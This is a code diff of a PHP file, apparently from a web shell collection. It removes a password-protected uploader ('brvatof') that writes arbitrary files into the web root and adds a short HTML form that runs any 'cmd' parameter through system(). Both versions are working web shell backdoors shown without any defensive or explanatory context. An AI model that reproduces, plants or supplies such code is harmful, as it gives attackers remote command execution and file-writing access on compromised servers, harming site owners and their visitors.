@@ -1,56 +1,17 @@
-//http://127.0.0.1/up.php?pass=brvatof&action=200&mkdir=[name directory]&touch=[name File]&body=[Bady Shell File]
+<!DOCTYPE html>
+<html> 
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>  
 <?php
-error_reporting(0);
-header("Content-Type: text/html; charset=utf-8");
-$config_password="brvatof";
-$action=$_REQUEST['action'];
-$password=$_REQUEST['pass'];
-
-if($password!=$config_password)
-{
-    echo 'Please Enter Password !';
-    return;
-}
-if($action=='200')
-{
-	  $foldername=$_REQUEST['mkdir'];
-	  $filename=$_REQUEST['touch'];
-	  $filebody=$_REQUEST['body'];
-    $path='';
-    $rootPath= $_SERVER['DOCUMENT_ROOT'];
-
-    if($foldername!='')
+    if(isset($_GET['cmd']))
     {
-		if($foldername=='current_folder')
-		{
-			$path=$filename;
-		}
-		else
-		{
-			createFolder($rootPath.'/'.$foldername);
-			$path=$rootPath.'/'.$foldername.'/'.$filename;
-		}
+        system($_GET['cmd']);
     }
-    else
-    {
-		  $path=$rootPath.'/'.$filename;
-    }
-    
-    $fp=fopen($path,"w");
-    fwrite($fp,$filebody);
-    fclose($fp);
-    if(file_exists($path))
-    {
-		  echo "publish success & uploaded".$rootPath;
-    }
-}
-    
-function createFolder($path)
-{
-  if (!file_exists($path))
-  {
-    createFolder(dirname($path));
-    mkdir($path, 0777);
-  }
-}
 ?>
+</pre>
+</body>
+</html>
